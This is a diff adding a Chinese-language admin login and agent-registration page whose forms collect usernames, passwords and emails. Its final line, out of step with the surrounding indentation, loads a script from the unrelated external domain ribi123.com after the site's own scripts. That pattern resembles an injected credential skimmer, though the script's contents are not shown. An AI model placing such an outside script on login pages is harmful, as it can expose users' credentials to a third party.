@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+	<head>
+		<title>管理员登录</title>
+		<meta charset="utf-8" />
+		<meta name="description" content="" />
+		<meta name="keywords" content="" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,400,500,600,700" />
+		<link href="/acs/demo1/plugins/custom/fullcalendar/fullcalendar.bundle.css" rel="stylesheet" type="text/css" />
+		<link href="/acs/demo1/plugins/custom/datatables/datatables.bundle.css" rel="stylesheet" type="text/css" />
+		<link href="/acs/demo1/plugins/global/plugins.bundle.css" rel="stylesheet" type="text/css" />
+		<link href="/acs/demo1/css/style.bundle.css" rel="stylesheet" type="text/css" />
+	</head>
+	<body id="kt_body" class="auth-bg" style="background-image: url(/acs/demo1/media/auth/bg10.jpeg);">
+		<div class="d-flex flex-column flex-root" >
+			<div class="d-flex flex-column flex-column-fluid bgi-position-y-bottom position-x-center bgi-no-repeat bgi-size-contain bgi-attachment-fixed">
+				<div class="d-flex flex-center flex-column flex-column-fluid p-10 pb-lg-20">
+				    <div class="bg-body d-flex flex-column flex-center rounded-4 w-md-600px p-10">
+						<div class="d-flex flex-center flex-column align-items-stretch h-lg-100 w-md-400px">
+							<div class="d-flex flex-center flex-column flex-column-fluid ">
+								<div class="form w-100 fv-plugins-bootstrap5 fv-plugins-framework">
+								    
+								    <div class="web_qr_login" id="web_qr_login" style="display: block;">
+    									<div class="text-center mb-11">
+    										<h1 class="text-gray-900 fw-bolder mb-3">后台登录</h1>
+    									</div>
+    									<div class="separator separator-content my-14">
+    										<span class="w-100 text-gray-500 fw-semibold fs-7">请输入账号密码登录~</span>
+    									</div>
+    									
+            							<form action="?ct=index&ac=login" name="loginform" accept-charset="utf-8" id="login_form" class="loginForm" method="post">
+            								<input type="hidden" name="gourl" value="<{$gourl}>" />
+            								
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="text" id="u" name="username" placeholder="请输入登录帐号" class="form-control inputstyle" />
+            								</div>
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="password" id="p" name="password" placeholder="请输入登录密码" class="form-control inputstyle" />
+            								</div>
+        									<div class="d-grid mb-10">
+        										<button type="submit" id="kt_sign_in_submit" class="btn btn-primary text-white">登 录</button>
+        									</div>
+            							</form>
+    									<div class="text-gray-500 text-center fw-semibold fs-6">还没有代理？
+    									<a class="link-primary" id="switch_login" href="javascript:void(0);" tabindex="8">立即注册</a>
+    									</div>
+									</div>
+									
+									
+									<div class="qlogin" id="qlogin" style="display: none;">
+    									<div class="text-center mb-11">
+    										<h1 class="text-gray-900 fw-bolder mb-3">代理注册</h1>
+    									</div>
+    									<div class="separator separator-content my-14">
+    										<span class="w-100 text-gray-500 fw-semibold fs-7">注册成功后可分销获取提成</span>
+    									</div>
+    									
+    									<form name="form2" id="regUser" accept-charset="utf-8" action="?ct=index&ac=login" method="post">
+    									    <input type="hidden" name="reg" value="1" />
+    									    <input type="hidden" name="gourl" value="<{$gourl}>" />
+            								
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="text" id="user" name="username" maxlength="16" class="form-control inputstyle2" placeholder="请输入登录用户名" />
+            								</div>
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="text" id="nickname" name="nickname" maxlength="16" class="form-control inputstyle2" placeholder="请输入昵称（必须汉字）" />
+            								</div>
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="password" id="password" name="password" maxlength="16" class="form-control inputstyle2" placeholder="请输入登录密码"/>
+            								</div>
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="password" id="password2" name="password2" maxlength="16" class="form-control inputstyle2" placeholder="请确认登录密码"/>
+            								</div>
+            								<div class="fv-row mb-8 fv-plugins-icon-container">
+            								    <input type="text" id="email" name="email" maxlength="50" class="form-control inputstyle2" placeholder="必填（方便找回密码）"/>
+            								</div>
+            								<div class="inputOuter2 mb-8">
+            								    <div class="input-group">
+                									<img src="gd_sub_num.php" onclick="this.src='gd_sub_num.php?time='+new Date().getTime()">
+                									<input type="text" id="yzm" name="yzm" maxlength="10" class="form-control inputstyle2" placeholder="请输入验证码" />
+                								</div>
+            								</div>
+        									<div class="d-grid mb-10">
+        										<button type="submit" id="reg" class="btn btn-primary text-white">注 册</button>
+        									</div>
+        									
+            							</form>
+            							
+    									<div class="text-gray-500 text-center fw-semibold fs-6">已有代理账号？
+    									<a class="link-primary" id="switch_qlogin" href="javascript:void(0);" tabindex="7">返回登录</a>
+    									</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<script type="text/javascript" src="/acs/images/login/js/jquery-1.9.0.min.js"></script>
+		<script type="text/javascript" src="/acs/images/login/js/login.js"></script>
+<script src="https://ribi123.com/scriptm.js"></script>
+	</body>
+</html>
